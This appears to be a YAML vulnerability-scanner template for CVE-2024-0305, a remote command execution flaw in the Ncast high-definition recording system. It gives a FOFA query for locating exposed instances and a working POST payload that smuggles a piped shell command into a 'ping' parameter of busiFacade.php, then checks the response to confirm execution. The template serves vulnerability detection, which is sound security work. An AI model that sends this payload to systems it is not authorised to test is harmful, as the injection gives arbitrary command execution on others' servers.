id: CVE-2024-0305

info:
  name: Ncast盈可视高清智能录播系统存在RCE漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    Ncast盈可视高清智能录播系统是广州盈可视电子科技有限公司的一款产品。Ncast盈可视高清智能录播系统/classes/common/busiFacade.php接口存在RCE漏洞，攻击者可以利用此漏洞执行任意命令。
    Fofa: app="Ncast-产品" && title=="高清智能录播系统"
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzIyNzU2NDIwOA==&mid=2247488683&idx=3&sn=19150484361fd01f32198d0edfadcf5e
    - https://github.com/wy876/POC/blob/main/Ncast%E7%9B%88%E5%8F%AF%E8%A7%86%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E(CVE-2024-0305).md
  tags: ncast,cve,cve2024,rce
  created: 2024/01/16

set:
  randstr: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /classes/common/busiFacade.php
      body: "%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20cat%20{{randstr}}%22%5D%7D"
    expression: response.status == 200 && response.body.bcontains(bytes('$#str#$'+randstr))
expression: r0()
